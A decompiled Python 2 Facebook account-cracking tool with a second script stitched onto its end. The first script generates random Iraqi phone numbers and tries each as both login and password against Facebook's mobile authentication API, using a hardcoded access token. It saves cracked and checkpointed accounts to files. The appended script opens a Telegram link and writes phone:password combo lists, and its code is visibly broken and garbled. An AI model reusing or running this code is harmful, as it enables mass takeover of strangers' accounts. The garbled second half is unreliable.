# Decompiled By vip
# uncompyle6 version 3.7.4
# Python bytecode 2.7
# Decompiled from: Python 2.7.18 (default, Jan  8 2021, 21:22:55) 
# [GCC 4.2.1 Compatible Android (6454773 based on r365631c2) Clang 9.0.8 (https:/
# Embedded file name: dg
import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
os.system('rm -rf .txt')
for n in range(100000):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()

try:
    import requests
except ImportError:
    os.system('pip2 install requests')

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    time.sleep(1)
    os.system('python2 nmbr.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)


def t():
    time.sleep(1)


def cb():
    os.system('clear')


logo =    '''\033[31;1m  
| |            | |             | | | |                
 | |_ ___   ___ | |  _ __  _   _| |_| |__   ___  _ __  
 | __/ _ \ / _ \| | | '_ \| | | | __| '_ \ / _ \| '_ \ 
 | |_ (_) | (_) | | | |_) | |_| | |_| | | | (_) | | | |
  \__\___/ \___/|_| | .__/ \__, |\__|_| |_|\___/|_| |_|
                    | |     __/ |                      
                    |_|    |___/                     
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~ 
\033[36;1mCODE BY : daroy_python 
\033[36;1mTELEGRAM: @daroy_python
\033[32;1mCHANNEL : t.me/tool_pythons
\033[32;1mGROPCHAT: t.me/pythons_tool 
daro_python_official 
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~'''
back = 0
successful = []
cpb = []
oks = []
id = []

def menu():
    os.system('clear')
    print logo
    print 42 * '\x1b[1;91m='
    print '\x1b[1;94m[1]\x1b[1;92m  KURDSTAN   \x1b[1;91m\xe2\x87\x8b  \x1b[1'
    print ' [0]\x1b[31;1m  DARCHUN            '
    print '>>\x1b[1;92m TOOL BY DAROY PYTHON (SHER PYTHON) \x1b[1;91m(\x1b[1;97mV2\x1b[1;91m) '
    print 42 * '\x1b[1;91m='
    action()


def action():
    global cpb
    global oks
    bch = raw_input('\n\x1b[1;91mHAL BZHERA \x1b[1;93m>>>\x1b[1;95m  ')
    if bch == '':
        print '[!] Fill in correctly'
        action()
    elif bch == '1':
        os.system('clear')
        print logo
        print '\x1b[1;91m770 771 772 773 - 750 751 752 - 780 781 782'
        try:
            c = raw_input('\x1b[1;96m RAQMEK HAL BZHERA  : ')
            k = '+964'
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())

        except IOError:
            print '[!] File Not Found'
            raw_input('\n[ Back ]')
            menu()

    elif bch == '0':
        exb()
    else:
        print '[!] Fill in correctly'
        action()
    xxx = str(len(id))
    psb('[\xe2\x9c\x93] HAMU RAQAMAKAN: ' + xxx)
    time.sleep(0.1)
    psb('\x1b[1;91m[\xe2\x9c\x93]\x1b[1;94m KAME BOSA DLAKAM......')
    time.sleep(0.1)
    psb('TOLAKA TANYA BA XATY IQ ONLINE FTTH  W KOREK ZOR BASHA')
    time.sleep(0.5)
    print 42 * '\x1b[1;91m='

    def main(arg):
        user = arg
        try:
            os.mkdir('save')
        except OSError:
            pass

        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q:
                print '\x1b[1;92m[ISH DAKA]\x1b[1;95m ' + k + c + user + ' >>> ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '>>>' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;93m[ISH NAKA]\x1b[1;96m ' + k + c + user + ' >>> ' + pass1 + '\n'
                cps = open('save/checkpoint.txt', 'a')
                cps.write(k + c + user + '>>>' + pass1 + '\n')
                cps.close()
                cpb.append(c + user + pass1)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print 42 * '\x1b[1;91m='
    print '[\xe2\x9c\x93]\x1b[1;93m Process Has Been Completed ....'
    print '[\xe2\x9c\x93]\x1b[1;92m Total OK/\x1b[1;96mCP : ' + str(len(oks)) + '/' + str(len(cpb))
    print '[\xe2\x9c\x93]\x1b[1;91m CP File Has Been Saved : save/checkpoint.txt'
    raw_input('\n[Press Enter To Go Back]')
    os.system('python2 .README.md')


if __name__ == '__main__':
    menu()
    import webbrowser
webbrowser.open('https://t.me/Captinteam')
import os
try:
    import uuid
except:
    os.system('pip install uuid')

try:
    from random import *
except:
    os.systeam('pip install random ')

try:
    import string
except:
    os.system('pip install string')

try:
    import requests
except:
    os.system('pip install requests ')

try:
    from user_agent import generate_user_agent
except:
    os.system('pip install user_agent ')

try:
    from datetime import datetime
except:
    os.system('pip install datetime ')
else:
    try:
        import time
    except:
        os.system('pip install time')
    else:
        os.system('clear')
        try:
            import pyfiglet
        except:
            os.system('pip install pyfiglet')
        else:
            os.system('clear')
            import pyfiglet, os
            from time import sleep
            import webbrowser
            Z = '\x1b[2;31m'
            G = '\x1b[1;32m'
            import random, uuid, requests, string
            from user_agent import generate_user_agent
            from datetime import datetime
            from random import *
            from time import sleep
            import requests, os, random, json, threading, secrets, uuid
            from time import sleep
            from datetime import datetime
            from secrets import token_hex
            from uuid import uuid4
            from user_agent import generate_user_agent
            from uuid import uuid4
        Z = '\x1b[1;31m'
        X = '\x1b[1;33m'
        Z1 = '\x1b[2;31m'
        F = '\x1b[2;32m'
        A = '\x1b[2;34m'
        C = '\x1b[2;35m'
        B = '\x1b[2;36m'
        K = '\x1b[1;34m'

        def AAlosh(s):
            for AAlosh in s + '\n':
                sys.stdout.write(talal)
                sys.stdout.flush()
                sleep(0.07142857142857142)
                sys.exit()


        AAlosh = F + '\n===============================\n \n\x1b[2;36m\n[1] drust krdne  combo Vip                  \n'
        os.system('clear')
        r = requests.session()
        print(AAlosh)
        TOOLS = input(C + ' Halbzhera : ' + B)
    

        if TOOLS == '1':
            os.system('clear')
        import random
        make = '0987654321'
        h = 0
        while h < 10000:
            c = str(''.join((random.choice(make) for i in range(7))))
            kj = '+964750' + c
            jk = '0750' + c
            combo = kj + ':' + jk
            print(combo)
            g = open('combo.txt','a')
            g.write(combo + '\n')
            h = h + 1
